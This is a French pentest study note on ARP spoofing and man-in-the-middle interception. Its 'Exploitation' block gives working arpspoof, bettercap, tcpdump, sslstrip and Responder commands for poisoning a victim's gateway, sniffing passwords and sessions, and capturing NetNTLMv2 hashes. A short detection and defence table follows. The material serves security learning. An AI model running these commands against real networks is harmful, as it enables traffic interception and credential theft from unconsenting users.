---
title: "ARP Spoofing et MITM"
type: technique
categorie: wireless
tags:
  - cyber
  - technique
  - wireless
statut: publie
---




# ARP Spoofing & MITM

> [!info] **En 1 phrase**
> MITM (Man-In-The-Middle) = s'intercaler **entre** la victime et sa passerelle pour voir/modifier
> son trafic — la méthode classique est l'**empoisonnement ARP** sur un réseau local.

---

## Concept

```mermaid
flowchart LR
    V[Victime] -->|trafic réel| M[Attaquant MITM]
    M -->|relaie| R[Routeur]
    R --> I[Internet]
    I -.->|réponse| R
    R -->|relaie| M
    M -->|modifie/observe| V
```

> [!info] **Pourquoi ARP**
> ARP associe IP→MAC **sans authentification**. On envoie de fausses réponses ARP pour que la
> victime pense que notre MAC = passerelle → tout son trafic passe par nous.

---

## Exploitation

```bash
# 1. Forwarding (sinon la victime perd Internet)
sysctl net.ipv4.ip_forward=1

# 2. Empoisonner (les 2 sens)
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1 &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50 &

# bettercap (moderne)
sudo bettercap -iface eth0
> net.probe on
> arp.spoof on
> net.sniff on

# 3. Capturer
tcpdump -i eth0 -n -A | grep -iE "password|login|session"

# 4. Dégradé SSL (ancien) / hashes (moderne)
sslstrip -l 10000
sudo responder -I eth0 -wrf        # → hashes NetNTLMv2 (voir LLMNR poisoning)
```

---

## Détection & Défense

| Réponse | Détail |
|---|---|
| **DHCP snooping** | Filtre les réponses ARP non autorisées (switch) |
| **ARP filtering / Static ARP** | Pare-feu / config manuelle |
| **HTTPS / HSTS / cert pinning** | Neutralise l'écoute du trafic chiffré |
| **Surveillance** | Dupliquer les MAC, logs ARP anormaux |

---

## Tips & Pièges

> [!tip] **MITM moderne = peu rentable sans cert**
> Le trafic est chiffré partout. Les cibles rentables : **protocoles legacy**, **hashes NTLM**
> (via Responder), et les **requêtes claires** internes.

> [!warning] **Piège** : sans `ip_forward=1`, la victime **perd Internet** → l'utilisateur le remarque immédiatement.

---

## Liens

- [[LLMNR-NBT-NS Poisoning| LLMNR/NBT-NS Poisoning]]
- [[NTLM Relay| NTLM Relay]]
- → Note complète : [[07 - Wireless, MITM & Social Engineering| Wireless / MITM / SE]]
